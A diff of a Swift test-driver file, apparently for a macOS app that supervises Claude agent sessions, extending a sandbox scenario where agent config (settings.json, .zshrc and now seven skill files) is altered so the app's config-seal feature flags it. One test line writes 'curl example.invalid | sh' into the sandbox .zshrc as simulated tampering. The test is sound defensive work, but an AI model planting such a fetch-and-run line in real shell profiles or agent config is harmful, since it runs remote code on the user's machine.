@@ -783,7 +783,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
     }
 
     /// The agents' config held for the fake lead (`ConfigSeal`): sealed, a worker of its team bound, then the sandbox's
-    /// own home's ~/.claude/settings.json and ~/.zshrc changed (never the user's), and the lead's look holds them; its
+    /// own home's ~/.claude/settings.json, ~/.zshrc and seven files in ~/.claude/skills changed (never the user's), and the lead's look holds them; its
     /// card, with Accept, is under the lead's chat. `accept` clicks it.
     func configHold(_ how: String, _ done: @escaping (String?) -> Void) {
         guard fakeList.contains(where: { $0.label.hasPrefix("Lead · ") }) else { return done("no fake lead: lead first") }
@@ -804,6 +804,11 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 try FileManager.default.createDirectory(atPath: home + "/.claude", withIntermediateDirectories: true)
                 try #"{"model":"opus"}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                 try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                let skills = (0..<7).map { home + "/.claude/skills/skill-\($0)/SKILL.md" }
+                for path in skills {
+                    try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
+                    try "before\n".write(toFile: path, atomically: true, encoding: .utf8)
+                }
                 let app = book.vault(folder: folder, as: { .app })
                 if (try? app.current(.lead, root: root, task: nil)) == nil {
                     try app.bind(try app.startLead(root: root, branch: "main"), root: root, session: "sandbox-lead")
@@ -816,6 +821,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 }
                 try #"{"model":"opus","hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                 try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
+                for path in skills { try "after\n".write(toFile: path, atomically: true, encoding: .utf8) }
                 guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
             } catch {
                 return fail("couldn't hold the config: \(error)")
@@ -1182,7 +1188,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
         ("tell JSON", "hands a fake Claude (the selected one, or the one labelled \"to\") a FakeClaude op, e.g. '{\"op\": \"permission\", \"command\": \"swift build\"}' or '{\"op\": \"work\"}' (see Tests/VibeSwitcherTests/FakeClaude.swift)"),
         ("notify prepare|allow|deny", "a permission prompt's banner for the selected fake session (the sandbox posts no notifications): prepare reads its screen as posting the banner does (whether it gets Allow and Deny); allow or deny runs that banner's action (`PromptActions.handle`), a failure shown as the chat card's notice"),
         ("new [codex|shell|zsh] [LABEL]", "starts another fake session: a Claude, or a Codex or a plain shell (cat), or an interactive zsh on the sandbox's home"),
-        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json and ~/.zshrc changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
+        ("confighold [outside|accept]", "the agents' config held for the fake lead (ConfigSeal): its team's worker bound (outside: none, so it's held as changed outside a team session), then the sandbox home's ~/.claude/settings.json, ~/.zshrc and seven skills changed (never yours); its card, with Accept, is under the lead's chat. accept clicks it"),
         ("push [click|decline]", "the fake lead asks to push (push_remote): its folder a scratch repository and a scratch bare remote as origin (never GitHub), three commits ahead; its card, with Push and Decline, is under the lead's chat. click or decline settles it as those buttons do"),
         ("clear", "ends and removes every fake session: the sidebar is empty, with its New Session menu"),
         ("views", "the main window's AppKit views: how many, how deep, and the most common kinds (a chat that grows them stalls layout)"),
